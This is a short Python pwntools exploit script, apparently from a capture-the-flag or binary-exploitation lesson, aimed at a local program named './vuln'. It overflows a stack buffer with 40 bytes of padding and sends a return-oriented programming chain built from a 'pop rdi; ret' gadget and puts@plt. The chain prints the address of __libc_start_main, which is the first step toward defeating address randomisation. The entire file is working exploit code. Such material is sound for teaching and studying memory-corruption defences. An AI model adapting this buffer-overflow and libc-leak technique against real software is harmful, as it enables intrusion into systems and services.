from pwn import * # Import pwntools

p = process("./vuln") # start the vuln binary
elf = ELF("./vuln") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
PUTS = elf.plt['puts']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

base = "A"*32 + "B"*8 #Overflow buffer until return address
# Create rop chain
rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS)

#Send our rop-chain payload
p.sendlineafter("ROP.", rop)

#Parse leaked address
p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

p.close()